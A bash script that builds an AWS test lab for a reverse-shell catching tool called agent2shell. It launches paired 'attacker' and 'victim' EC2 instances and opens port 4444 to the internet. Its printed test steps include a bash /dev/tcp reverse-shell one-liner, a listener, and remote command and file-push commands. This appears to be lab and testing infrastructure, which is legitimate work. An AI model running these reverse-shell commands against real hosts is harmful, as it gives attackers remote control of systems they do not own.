#!/usr/bin/env bash
set -euo pipefail
export AWS_PAGER=""

REGION="${AWS_REGION:-us-east-1}"
INSTANCE_TYPE="${A2S_INSTANCE_TYPE:-t3.micro}"
KEY_DIR="$HOME/.ssh/agent2shell"
TAG_KEY="agent2shell-lab"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

echo "[*] agent2shell E2E lab — creating infrastructure"
echo "[*] Region: $REGION | Instance type: $INSTANCE_TYPE"

mkdir -p "$KEY_DIR"

# --- Security Group ---
SG_NAME="a2s-lab-sg"
SG_ID=$(aws ec2 describe-security-groups \
    --filters "Name=group-name,Values=$SG_NAME" \
    --query 'SecurityGroups[0].GroupId' \
    --output text --region "$REGION" 2>/dev/null || echo "None")

if [ "$SG_ID" = "None" ] || [ -z "$SG_ID" ]; then
    echo "[*] Creating security group..."
    SG_ID=$(aws ec2 create-security-group \
        --group-name "$SG_NAME" \
        --description "agent2shell E2E lab" \
        --query 'GroupId' --output text --region "$REGION")

    aws ec2 authorize-security-group-ingress --group-id "$SG_ID" --region "$REGION" \
        --ip-permissions \
        "IpProtocol=tcp,FromPort=22,ToPort=22,IpRanges=[{CidrIp=0.0.0.0/0,Description=SSH}]" \
        "IpProtocol=tcp,FromPort=4444,ToPort=4444,IpRanges=[{CidrIp=0.0.0.0/0,Description=RevShell}]" \
        > /dev/null
    echo "[*] Security group created: $SG_ID"
else
    echo "[*] Security group exists: $SG_ID"
fi

# --- Key Pairs ---
create_key() {
    local name="$1"
    local key_file="$KEY_DIR/${name}.pem"
    if [ -f "$key_file" ]; then
        echo "[*] Key $name exists: $key_file"
        return
    fi
    aws ec2 delete-key-pair --key-name "$name" --region "$REGION" 2>/dev/null || true
    aws ec2 create-key-pair --key-name "$name" --query 'KeyMaterial' \
        --output text --region "$REGION" > "$key_file"
    chmod 600 "$key_file"
    echo "[*] Key created: $key_file"
}

create_key "a2s-attacker"
create_key "a2s-victim"

# --- AMI ---
AMI_ID=$(aws ec2 describe-images --owners amazon \
    --filters 'Name=name,Values=al2023-ami-2023*-x86_64' 'Name=state,Values=available' \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text --region "$REGION")
echo "[*] AMI: $AMI_ID"

# --- Build agent2shell binary for Linux amd64 ---
echo "[*] Cross-compiling agent2shell for linux/amd64..."
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build \
    -ldflags "-s -w" \
    -o "$SCRIPT_DIR/agent2shell-linux-amd64" \
    "$PROJECT_DIR/cmd/agent2shell/"
echo "[*] Binary ready: $SCRIPT_DIR/agent2shell-linux-amd64"

# --- Attacker instance ---
ATTACKER_USER_DATA=$(cat <<'USERDATA'
#!/bin/bash
yum install -y bash coreutils
USERDATA
)

echo "[*] Launching attacker instance..."
ATTACKER_ID=$(aws ec2 run-instances \
    --image-id "$AMI_ID" \
    --instance-type "$INSTANCE_TYPE" \
    --key-name "a2s-attacker" \
    --security-group-ids "$SG_ID" \
    --user-data "$ATTACKER_USER_DATA" \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=a2s-attacker},{Key=$TAG_KEY,Value=true}]" \
    --query 'Instances[0].InstanceId' \
    --output text --region "$REGION")
echo "[*] Attacker instance: $ATTACKER_ID"

# --- Victim instance ---
VICTIM_USER_DATA=$(cat <<'USERDATA'
#!/bin/bash
yum install -y bash coreutils python3 openssl perl
USERDATA
)

echo "[*] Launching victim instance..."
VICTIM_ID=$(aws ec2 run-instances \
    --image-id "$AMI_ID" \
    --instance-type "$INSTANCE_TYPE" \
    --key-name "a2s-victim" \
    --security-group-ids "$SG_ID" \
    --user-data "$VICTIM_USER_DATA" \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=a2s-victim},{Key=$TAG_KEY,Value=true}]" \
    --query 'Instances[0].InstanceId' \
    --output text --region "$REGION")
echo "[*] Victim instance: $VICTIM_ID"

# --- Wait for running ---
echo "[*] Waiting for instances to start..."
aws ec2 wait instance-running --instance-ids "$ATTACKER_ID" "$VICTIM_ID" --region "$REGION"

# --- Get IPs ---
ATTACKER_IP=$(aws ec2 describe-instances --instance-ids "$ATTACKER_ID" \
    --query 'Reservations[0].Instances[0].PublicIpAddress' \
    --output text --region "$REGION")

VICTIM_IP=$(aws ec2 describe-instances --instance-ids "$VICTIM_ID" \
    --query 'Reservations[0].Instances[0].PublicIpAddress' \
    --output text --region "$REGION")

# --- Wait for SSH readiness ---
echo "[*] Waiting for SSH on attacker ($ATTACKER_IP)..."
for i in $(seq 1 30); do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i "$KEY_DIR/a2s-attacker.pem" "ec2-user@$ATTACKER_IP" "echo ready" 2>/dev/null; then
        break
    fi
    sleep 5
done

echo "[*] Waiting for SSH on victim ($VICTIM_IP)..."
for i in $(seq 1 30); do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -i "$KEY_DIR/a2s-victim.pem" "ec2-user@$VICTIM_IP" "echo ready" 2>/dev/null; then
        break
    fi
    sleep 5
done

# --- Upload agent2shell to attacker ---
echo "[*] Uploading agent2shell to attacker..."
scp -o StrictHostKeyChecking=no -i "$KEY_DIR/a2s-attacker.pem" \
    "$SCRIPT_DIR/agent2shell-linux-amd64" \
    "ec2-user@$ATTACKER_IP:/home/ec2-user/agent2shell"

ssh -o StrictHostKeyChecking=no -i "$KEY_DIR/a2s-attacker.pem" \
    "ec2-user@$ATTACKER_IP" "chmod +x /home/ec2-user/agent2shell"

echo "[*] agent2shell installed on attacker"

# --- Save state for destroy script ---
cat > "$SCRIPT_DIR/.ec2-lab-state" <<EOF
ATTACKER_ID=$ATTACKER_ID
VICTIM_ID=$VICTIM_ID
ATTACKER_IP=$ATTACKER_IP
VICTIM_IP=$VICTIM_IP
SG_ID=$SG_ID
REGION=$REGION
EOF

# --- Output ---
echo ""
echo "========================================"
echo "  agent2shell E2E Lab Ready"
echo "========================================"
echo ""
echo "Keys:"
echo "  Attacker: $KEY_DIR/a2s-attacker.pem"
echo "  Victim:   $KEY_DIR/a2s-victim.pem"
echo ""
echo "Connect:"
echo "  Attacker: ssh -i $KEY_DIR/a2s-attacker.pem ec2-user@$ATTACKER_IP"
echo "  Victim:   ssh -i $KEY_DIR/a2s-victim.pem ec2-user@$VICTIM_IP"
echo ""
echo "E2E Test Steps:"
echo ""
echo "  1. Start listener on attacker:"
echo "     ssh -i $KEY_DIR/a2s-attacker.pem ec2-user@$ATTACKER_IP './agent2shell catch -p 4444'"
echo ""
echo "  2. Send reverse shell from victim:"
echo "     ssh -i $KEY_DIR/a2s-victim.pem ec2-user@$VICTIM_IP \"bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'\""
echo ""
echo "  3. SSH Tunnel (forward Unix socket to your laptop):"
echo "     ssh -NL /tmp/a2s-ec2.sock:/tmp/a2s-1.sock -i $KEY_DIR/a2s-attacker.pem ec2-user@$ATTACKER_IP"
echo ""
echo "  4. Use agent2shell locally:"
echo "     ./agent2shell run whoami -s /tmp/a2s-ec2.sock"
echo "     ./agent2shell status -s /tmp/a2s-ec2.sock"
echo "     ./agent2shell push ./test.txt /tmp/test.txt -s /tmp/a2s-ec2.sock"
echo ""
echo "Destroy: $SCRIPT_DIR/ec2-destroy.sh"
echo ""
